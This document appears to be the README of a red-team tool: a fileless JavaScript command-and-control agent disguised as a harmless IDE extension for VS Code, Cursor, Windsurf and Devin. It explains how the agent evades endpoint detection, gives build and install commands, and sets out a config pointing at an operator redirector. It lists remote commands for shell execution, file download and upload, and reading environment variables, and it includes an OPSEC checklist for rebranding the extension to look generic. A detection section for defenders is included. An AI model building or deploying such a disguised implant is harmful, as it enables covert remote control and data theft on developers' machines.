# vscode-websocket-c2

A **fileless, pure-JavaScript C2 agent** that runs entirely inside a
VS Code-compatible IDE extension host (VS Code, Cursor, Windsurf, Devin,
and other Electron-based AI IDEs) and communicates over a single
WebSocket connection.

> **Authorized use only.** Red team engagements, purple team exercises,
> and controlled lab research. See [SECURITY.md](SECURITY.md).

---

## Why this bypasses EDR / security controls

Traditional C2 implants are caught because they introduce **foreign executable
code** onto the endpoint. This agent avoids every one of those surfaces:

### 1. No binary on disk — nothing to hash, sign, or scan

| Traditional implant | This agent |
|---|---|
| EXE/ELF/Mach-O dropped to disk | **Nothing is written** |
| Static AV scan catches known signatures | No file exists to scan |
| Unsigned binary execution alerts | No new executable is launched |
| YARA rules match binary artifacts | The "payload" is a `.js` text file |
| Quarantine of suspicious downloads | The package is a standard `.vsix` |

EDR file-scanning engines have **zero visibility** into this agent because
there is no file for them to detonate, hash, or submit to cloud analysis.

### 2. Runs inside a trusted, signed parent process

The agent executes inside the **IDE's own extension host** — a legitimate,
code-signed, notarized process that the user and the OS already trust:

```
Devin Helper (Plugin)    ← signed Electron/Node process, already whitelisted
  └── extension.js       ← your agent code runs here, in-process
```

- Process tree analysis shows only the IDE's normal extension host.
- No suspicious parent-child relationships (no `IDE → nohup → unsigned binary`).
- The agent inherits the IDE's network permissions and application firewall
  profile.

### 3. WebSocket — one long-lived connection, no polling beacon chain

| HTTP beaconing | This agent |
|---|---|
| Periodic HTTP POSTs (every N seconds) | **Single persistent WSS connection** |
| Repeated TLS handshakes create JA3/JA4 fingerprints | One TLS handshake for the session |
| Each request is a separate log entry on proxies | Frames multiplex over one tunnel |
| Beacon interval analysis catches regularity | Jittered tasking over the same socket |

The connection idle state looks like a long-lived websocket session
(collaboration tools, language servers, and AI assistants all do this),
which blends into normal IDE telemetry traffic.

### 4. No C2 artifacts on the endpoint

- The C2 config is read at runtime from a file placed by the operator
  (or env var) and is **never committed to the package**.
- If no config is present, the agent is fully dormant — only legitimate
  cover features execute.
- All state is held in memory. Killing the IDE process leaves no residual
  agent artifacts.

### 5. What defenders can still see

For transparency and purple-teaming, these are the remaining behavioral
indicators:

- Extension host holding an **outbound WSS connection** to an unusual
  destination (netflow / DNS logs).
- `child_process` execution of shells from the extension host when tasks
  run (process lineage telemetry).
- An IDE extension installed from a **local VSIX** rather than the
  marketplace (extension inventory audit).
- A `config.json` file in the extension directory or
  `~/.config/workspace-dev-utils/` (file integrity monitoring).

None of these are static-signature detections — they require behavioral
analysis, which is exactly the gap this tool is designed to exercise.

---

## Quick start (5 minutes)

### Prerequisites

- Node.js 18+ and `vsce` (`npm install -g @vscode/vsce`)
- A Mythic team server with the **websocket** C2 profile, or any
  WebSocket-capable C2 listener (see [docs/CUSTOM_LISTENER.md](docs/CUSTOM_LISTENER.md))

### 1. Clone and build

```bash
git clone https://github.com/sam00/vscode-extension-websocket-c2.git
cd vscode-extension-websocket-c2
./build_extension.sh
```

Output: `workspace-dev-utils-1.0.0.vsix` (~13 KB).

### 2. Create your operator config

```bash
cp config.example.json config.json
```

Edit `config.json`:

```json
{
  "wsUrl": "wss://your-redirector.example.com:443/",
  "payloadUUID": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "aesPSK": "base64-key-from-mythic-build==",
  "encryptedExchangeCheck": false,
  "zombieTimeoutMs": 45000,
  "maxChunkBytes": 50000
}
```

### Persistence-mode additions (v2.1.0)

The agent now handles reconnects without dying:

| Feature | What it does |
|---|---|
| **Re-checkin on reconnect** | The Mythic WebSocket profile loses callback state when the socket drops. On every reconnect the agent re-sends `checkin` so your callback comes back instead of silently dying |
| **Zombie socket detection** | If no inbound data arrives for `zombieTimeoutMs` (default 45s), the agent closes the dead socket and reconnects from scratch |
| **Chunked task output** | Large responses (36 KB+) are split into 50 KB chunks via `postChunked`, preventing WSS frame size limits from wedging the connection |
| **Exponential backoff with cap** | Reconnect delay doubles up from 3s and tops out at 10 minutes, giving VPNs/network flap recovery time |
| **Config sanity check** | If `config.json` is missing required fields, the agent logs a warning and stays dormant (no partial startup that could crash the extension host) |

> `config.json` is **gitignored** and excluded from the VSIX. It is
> delivered to the target separately at runtime.

### 3. Deploy to the target

Install the VSIX into the target IDE:

```bash
# VS Code
code --install-extension workspace-dev-utils-1.0.0.vsix

# Cursor
cursor --install-extension workspace-dev-utils-1.0.0.vsix

# Devin / other Electron IDEs
ELECTRON_RUN_AS_NODE=1 /path/to/ide --install-extension workspace-dev-utils-1.0.0.vsix
```

Place the config on the target at one of the search paths:

| Priority | Path |
|---|---|
| 1 | Path set in `$C2_CONFIG_PATH` |
| 2 | `~/.config/workspace-dev-utils/config.json` |
| 3 | `<extension install dir>/config.json` |

The agent activates on the next IDE window load, waits a randomized delay,
and checks in.

### 4. Interact

In Mythic, the callback appears as a normal agent. All standard tasking
works: `shell`, `cd`, `ls`, `download`, `upload`, `whoami`, `ps`,
`ifconfig`, `sleep`, `exit`.

---

## How it works — architecture

```
┌──────────────────────────────────────────────────────────┐
│  Target IDE (VS Code / Cursor / Devin / Windsurf)        │
│                                                          │
│  Extension host process (signed, trusted)                │
│  ┌────────────────────────────────────────────────────┐  │
│  │  workspace-dev-utils extension                     │  │
│  │  ├─ Cover: path autocomplete, word count           │  │
│  │  └─ Agent: Mythic WS protocol client (pure JS)     │  │
│  │       └─ crypto: AES-256-CBC + HMAC-SHA256         │  │
│  │       └─ transport: single WSS connection          │  │
│  └────────────────────────────────────────────────────┘  │
│                    │                                     │
└────────────────────┼─────────────────────────────────────┘
                     │ wss:// (one TLS session)
                     ▼
              ┌─────────────┐
              │  Redirector │   ← operator-controlled front
              └──────┬──────┘
                     │
                     ▼
              ┌─────────────┐
              │  Team       │
              │  Server     │   ← Mythic / CS bridge / custom
              └─────────────┘
```

The agent never writes to disk, never spawns a separate implant process,
and never holds state outside the extension host's memory.

## Configuration reference

| Key | Default | Description |
|---|---|---|
| `wsUrl` | — | WebSocket URL of the C2 / redirector (**required**) |
| `payloadUUID` | — | Mythic payload UUID (**required**) |
| `aesPSK` | — | Base64 AES-256 pre-shared key (**required**) |
| `encryptedExchangeCheck` | `false` | `true` if the profile uses RSA EKE staging |
| `intervalSec` | `10` | Base poll interval in seconds |
| `jitterPct` | `30` | Poll jitter percentage |
| `startDelayMs` | `6000` | Delay after activation before first connect |
| `startJitterMs` | `5000` | Randomized additional startup delay |
| `userAgent` | IE11 UA | User-Agent for cover HTTP requests |

## Supported commands

| Command | Parameters | Description |
|---|---|---|
| `shell` | `<command string>` | Execute via `/bin/zsh` (macOS/Linux) or `cmd.exe` (Windows) |
| `cd` | `<path>` | Change working directory |
| `pwd` | — | Print working directory |
| `ls` | `[path]` | List directory contents |
| `cat` | `<path>` | Read file (text) |
| `download` | `<path>` | Read file and return base64 |
| `upload` | `{"path": "...", "content": "<b64>"}` | Write file from base64 |
| `whoami` | — | Current user |
| `hostname` | — | Host name |
| `id` | — | User/group IDs |
| `ps` | — | Process list |
| `ifconfig` | — | Network interfaces |
| `getenv` | — | Environment variables |
| `sleep` | `{"interval": N}` | Change poll interval |
| `exit` | — | Stop the agent |

Unknown commands fall through to `shell` execution.

## Repo layout

```
extension.js          Agent + cover features (single file, no dependencies)
package.json          Extension manifest (generic identity)
config.example.json   Operator config template — never shipped in the VSIX
build.js              Pre-package validation (syntax + config leak check)
build_extension.sh    One-shot build helper
docs/
  MYTHIC.md           Mythic websocket profile setup guide
  COBALT_STRIKE.md    External C2 bridge approach
  CUSTOM_LISTENER.md  Wire protocol spec for custom C2 listeners
media/icon.png        Extension icon
```

## OPSEC checklist before an operation

- [ ] Rebrand `package.json` (`name`, `displayName`, `publisher`, repo URLs)
- [ ] Replace `media/icon.png` with a generic-looking icon
- [ ] Generate a **fresh** Mythic payload per target (fresh UUID + PSK)
- [ ] Never commit `config.json` (it is gitignored — verify anyway)
- [ ] Point `wsUrl` at a redirector, never directly at the team server
- [ ] Use a redirector with a realistic TLS certificate if possible
- [ ] Use `startDelayMs` + `startJitterMs` to avoid predictable startup timing
- [ ] Consider `encryptedExchangeCheck: true` so the PSK is only used once

## Detection surface analysis

For blue teams and detection engineers, here's what to look for:

| Layer | Indicator | Data source |
|---|---|---|
| Network | Long-lived WSS to uncommon host from an IDE process | Netflow, TLS SNI logs |
| Process | Extension host spawning `zsh`/`bash`/`cmd.exe` | EDR process lineage |
| File | `config.json` in extension dir or `~/.config/workspace-dev-utils/` | FIM |
| IDE | Extension installed from VSIX not marketplace | Extension inventory |
| Behavioral | Extension host CPU/network activity without user editing | EDR behavioral |

## License

MIT — see [LICENSE](LICENSE).
